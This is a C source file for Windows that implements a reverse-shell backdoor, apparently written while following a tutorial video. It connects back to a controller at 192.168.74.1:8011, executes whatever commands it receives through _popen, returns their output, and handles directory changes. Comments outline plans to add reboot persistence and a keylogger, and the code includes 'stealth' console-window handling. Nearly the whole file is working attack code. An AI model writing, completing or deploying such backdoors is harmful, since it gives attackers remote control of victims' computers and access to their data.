#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size));

int sock;

/*
 * https://youtu.be/2-xNui9H-Ro?t=3484
 * PLAN
 * 1) create connection with our server inside main function
 * 2) create shell function (wait for incoming command and iterate over certain options)
 * 3) automatically start program when machine is rebooted
 * 4) start/spawn other programs
 * 5) navigating directories
 * 6) implement keylogger
 */

char* substr(const char *src, int m, int n)
{
    // get the length of the destination string
    int len = n - m;

    // allocate (len + 1) chars for destination (+1 for extra null character)
    char *dest = (char*)malloc(sizeof(char) * (len + 1));

    // extracts characters between m'th and n'th index from source string
    // and copy them into the destination string
    for (int i = m; i < n && (*(src + i) != '\0'); i++)
    {
        *dest = *(src + i);
        dest++;
    }

    // null-terminate the destination string
    *dest = '\0';

    // return the destination string
    return dest - len;
}

char buffer[1024];
char container[1024];
char response[18384];
char cwd[512];

void processCommand(){
    FILE* fp;
    fp = _popen(buffer, "r");
    while(fgets(container, 1024, fp) != NULL){
        strcat(response, container);
    }
    send(sock, response, sizeof(response), 0);
    fclose(fp);
}

void Shell(){

    while(1){
        long errorcode = 0;
        jump:
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(response, sizeof(response));
        recv(sock, buffer, sizeof(buffer), 0);
        printf("recieved command: %s\n", buffer);
        if(strncmp("q", buffer, 1) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else if(strncmp("cd ", buffer, 3) == 0){
            if(chdir(substr(buffer, 3, strlen(buffer))) != 0){
                printf("failed to change dir.\n");
                getcwd(cwd, sizeof(cwd));
                send(sock, cwd, sizeof(cwd), 0);
            }else{
                printf("changed.\n");
                getcwd(cwd, sizeof(cwd));
                send(sock, cwd, sizeof(cwd), 0);
            }
        }
        else {
            processCommand();
        }
    }
}

//int main(void){
//    HWND stealth;
//    int* HWNDp = &stealth;
//}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int CmdShow) {

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 1);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char* ServIP;
    WSADATA wsaData;

    ServIP = "192.168.74.1";
    ServPort = 8011;

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    start:
    printf("connection attempted\n");
    while (connect(sock, (struct sockaddr*) &ServAddr, sizeof(ServAddr)) != 0) {
        printf("Connection failed. Error code: %d\n", WSAGetLastError());
        Sleep(10);
        goto start;
    }
    printf("connected\n");
    getcwd(cwd, sizeof(cwd));
    send(sock, cwd, sizeof(cwd), 0);
    Shell();
    return 0;
}
